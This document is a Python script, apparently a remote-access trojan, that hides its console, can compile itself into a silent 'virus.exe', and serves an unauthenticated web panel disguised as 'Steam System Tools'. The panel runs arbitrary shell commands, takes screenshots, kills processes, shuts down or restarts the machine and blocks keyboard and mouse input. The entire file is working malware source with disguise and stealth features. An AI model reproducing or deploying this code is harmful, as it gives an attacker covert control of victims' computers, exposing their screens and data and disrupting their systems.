import subprocess
import sys
import os

# Автоустановка модулей
required_modules = ['flask', 'psutil', 'mss', 'pywin32', 'pillow']
for mod in required_modules:
    try:
        __import__(mod if mod != 'pillow' else 'PIL')
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', mod])

# Если аргумент exe — компилируем
if len(sys.argv) > 1 and sys.argv[1] == 'exe':
    try:
        __import__('PyInstaller')
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
    
    script_path = os.path.abspath(__file__)
    output_dir = os.path.dirname(script_path)
    
    subprocess.check_call([
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole',
        '--distpath', output_dir,
        '--workpath', os.path.join(output_dir, 'build'),
        '--specpath', output_dir,
        script_path
    ])
    
    # Удалить мусор после компиляции
    spec_file = os.path.join(output_dir, 'virus.spec')
    build_dir = os.path.join(output_dir, 'build')
    if os.path.exists(spec_file):
        os.remove(spec_file)
    if os.path.exists(build_dir):
        import shutil
        shutil.rmtree(build_dir)
    
    print(f'EXE created: {os.path.join(output_dir, "virus.exe")}')
    sys.exit(0)

import ctypes
import socket
import base64
from io import BytesIO
from flask import Flask, render_template_string, request, redirect, jsonify
import psutil
import mss

if sys.platform == 'win32':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

app = Flask(__name__)

mouse_frozen = False
keyboard_frozen = False

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Steam System Tools</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #1b2838; color: #c5c3c0; font-family: Arial; padding: 20px; }
        h1 { color: #66c0f4; margin-bottom: 5px; }
        .host { color: #666; font-size: 12px; margin-bottom: 15px; }
        .section { background: #16202d; padding: 15px; border-radius: 6px; margin-bottom: 15px; }
        .section h2 { color: #66c0f4; margin-bottom: 10px; font-size: 16px; }
        .btn-row { display: flex; gap: 8px; flex-wrap: wrap; }
        button { padding: 10px 18px; border: none; cursor: pointer; font-weight: bold; border-radius: 3px; font-size: 13px; }
        .btn-blue { background: #2a475e; color: #66c0f4; border: 1px solid #66c0f4; }
        .btn-red { background: #660000; color: #ff4444; border: 1px solid #cc0000; }
        .btn-orange { background: #663300; color: #ff8800; border: 1px solid #ff6600; }
        .btn-green { background: #003300; color: #00cc00; border: 1px solid #00ff00; }
        .btn-yellow { background: #444400; color: #ffff00; border: 1px solid #ffff00; }
        button:hover { opacity: 0.8; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
        th { background: #0a141c; padding: 8px; text-align: left; cursor: pointer; color: #66c0f4; }
        th:hover { background: #111d2b; }
        td { padding: 6px 8px; border-bottom: 1px solid #1a2a3a; }
        tr:hover { background: #1a2a3a; }
        .kill-btn { background: #660000; color: #ff4444; border: 1px solid #ff0000; padding: 4px 10px; cursor: pointer; font-size: 11px; border-radius: 2px; }
        .kill-btn:hover { background: #990000; }
        input, select { padding: 8px; background: #0a141c; border: 1px solid #2a475e; color: #fff; border-radius: 3px; }
        .cmd-row { display: flex; gap: 8px; margin-top: 8px; }
        .cmd-row input { flex: 1; }
        .status { padding: 4px 10px; border-radius: 3px; font-size: 11px; display: inline-block; margin-left: 8px; }
        .status-on { background: #003300; color: #00cc00; }
        .status-off { background: #330000; color: #cc0000; }
        #screenshot { max-width: 100%; margin-top: 10px; border: 2px solid #2a475e; display: none; }
    </style>
</head>
<body>
    <h1>STEAM SYSTEM TOOLS</h1>
    <p class="host">{{ hostname }} | {{ ip }} | CPU: {{ cpu }}% | RAM: {{ mem }}%</p>

    <div class="section">
        <h2>Quick Actions</h2>
        <div class="btn-row">
            <form method="POST" action="/logoff"><button class="btn-yellow">Log Off</button></form>
            <form method="POST" action="/restart"><button class="btn-orange">Restart</button></form>
            <form method="POST" action="/shutdown"><button class="btn-red">Shutdown</button></form>
            <button class="btn-blue" onclick="screenshot()">Screenshot</button>
            <button class="btn-orange" onclick="monitorOff()">Monitor Off</button>
            <button class="btn-green" onclick="monitorOn()">Monitor On</button>
        </div>
    </div>

    <div class="section">
        <h2>Mouse & Keyboard</h2>
        <div class="btn-row">
            <button id="btn-mouse" class="btn-blue" onclick="toggleMouse()">Freeze Mouse <span class="status status-off" id="mouse-status">OFF</span></button>
            <button id="btn-keyboard" class="btn-blue" onclick="toggleKeyboard()">Freeze Keyboard <span class="status status-off" id="keyboard-status">OFF</span></button>
        </div>
    </div>

    <div class="section">
        <h2>Command Line</h2>
        <div class="cmd-row">
            <input type="text" id="cmdInput" placeholder="cmd command...">
            <button class="btn-blue" onclick="runCmd()">Execute</button>
        </div>
        <pre id="cmdOutput" style="margin-top:8px; background:#0a141c; padding:8px; max-height:200px; overflow:auto; display:none;"></pre>
    </div>

    <div class="section" id="screenshotSection" style="display:none;">
        <h2>Screenshot <button class="btn-red" onclick="closeScreenshot()" style="float:right;">Close</button></h2>
        <img id="screenshot" src="" alt="Screenshot">
    </div>

    <div class="section">
        <h2>Processes ({{ count }})</h2>
        <table>
            <tr>
                <th onclick="sortTable(0)">PID</th>
                <th onclick="sortTable(1)">Process</th>
                <th onclick="sortTable(2)">CPU %</th>
                <th onclick="sortTable(3)">RAM MB</th>
                <th>Action</th>
            </tr>
            {% for p in processes %}
            <tr>
                <td>{{ p.pid }}</td>
                <td>{{ p.name }}</td>
                <td>{{ p.cpu }}</td>
                <td>{{ p.mem }}</td>
                <td>
                    <form method="POST" action="/kill">
                        <input type="hidden" name="pid" value="{{ p.pid }}">
                        <button class="kill-btn">KILL</button>
                    </form>
                </td>
            </tr>
            {% endfor %}
        </table>
    </div>

    <script>
        function toggleMouse() {
            fetch('/toggle_mouse').then(r => r.json()).then(d => {
                document.getElementById('mouse-status').textContent = d.state;
                document.getElementById('mouse-status').className = d.state === 'ON' ? 'status status-on' : 'status status-off';
            });
        }
        function toggleKeyboard() {
            fetch('/toggle_keyboard').then(r => r.json()).then(d => {
                document.getElementById('keyboard-status').textContent = d.state;
                document.getElementById('keyboard-status').className = d.state === 'ON' ? 'status status-on' : 'status status-off';
            });
        }
        function screenshot() {
            fetch('/screenshot').then(r => r.json()).then(d => {
                document.getElementById('screenshot').src = 'data:image/png;base64,' + d.img;
                document.getElementById('screenshotSection').style.display = 'block';
            });
        }
        function closeScreenshot() {
            document.getElementById('screenshotSection').style.display = 'none';
        }
        function monitorOff() { fetch('/monitor_off'); }
        function monitorOn() { fetch('/monitor_on'); }
        function runCmd() {
            let cmd = document.getElementById('cmdInput').value;
            fetch('/cmd?c=' + encodeURIComponent(cmd)).then(r => r.json()).then(d => {
                let out = document.getElementById('cmdOutput');
                out.style.display = 'block';
                out.textContent = d.output;
            });
        }
        function sortTable(n) {
            let table = document.querySelector('table');
            let rows = Array.from(table.rows).slice(1);
            let sorted = rows.sort((a,b) => {
                let x = a.cells[n].textContent;
                let y = b.cells[n].textContent;
                return isNaN(x) ? x.localeCompare(y) : parseFloat(x) - parseFloat(y);
            });
            if(table.dataset.sort === 'asc') { sorted.reverse(); table.dataset.sort = 'desc'; }
            else { table.dataset.sort = 'asc'; }
            sorted.forEach(r => table.appendChild(r));
        }
    </script>
</body>
</html>
"""

def get_processes():
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
        try:
            info = p.info
            procs.append({
                'pid': info['pid'],
                'name': info['name'],
                'cpu': info['cpu_percent'],
                'mem': round(info['memory_info'].rss / 1024 / 1024, 1)
            })
        except:
            pass
    return sorted(procs, key=lambda x: x['mem'], reverse=True)

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

@app.route('/')
def index():
    procs = get_processes()
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    return render_template_string(HTML, processes=procs, hostname=socket.gethostname(), ip=get_ip(), cpu=cpu, mem=mem, count=len(procs))

@app.route('/kill', methods=['POST'])
def kill():
    pid = int(request.form.get('pid'))
    try:
        psutil.Process(pid).kill()
    except:
        pass
    return redirect('/')

@app.route('/toggle_mouse')
def toggle_mouse():
    global mouse_frozen
    mouse_frozen = not mouse_frozen
    if mouse_frozen:
        ctypes.windll.user32.BlockInput(True)
    else:
        ctypes.windll.user32.BlockInput(False)
    return jsonify({'state': 'ON' if mouse_frozen else 'OFF'})

@app.route('/toggle_keyboard')
def toggle_keyboard():
    global keyboard_frozen
    keyboard_frozen = not keyboard_frozen
    if keyboard_frozen:
        ctypes.windll.user32.BlockInput(True)
    else:
        ctypes.windll.user32.BlockInput(False)
    return jsonify({'state': 'ON' if keyboard_frozen else 'OFF'})

@app.route('/shutdown', methods=['POST'])
def shutdown():
    os.system('shutdown /s /t 0')
    return 'OK'

@app.route('/restart', methods=['POST'])
def restart():
    os.system('shutdown /r /t 0')
    return 'OK'

@app.route('/logoff', methods=['POST'])
def logoff():
    os.system('shutdown /l')
    return 'OK'

@app.route('/screenshot')
def screenshot():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        img = sct.grab(monitor)
        buf = BytesIO()
        mss.tools.to_png(img.rgb, img.size, output=buf)
        return jsonify({'img': base64.b64encode(buf.getvalue()).decode()})

@app.route('/cmd')
def cmd():
    c = request.args.get('c', '')
    try:
        out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = out.decode('cp866', errors='replace')
    except Exception as e:
        output = str(e)
    return jsonify({'output': output})

@app.route('/monitor_off')
def monitor_off():
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
    return 'OK'

@app.route('/monitor_on')
def monitor_on():
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000, debug=False)
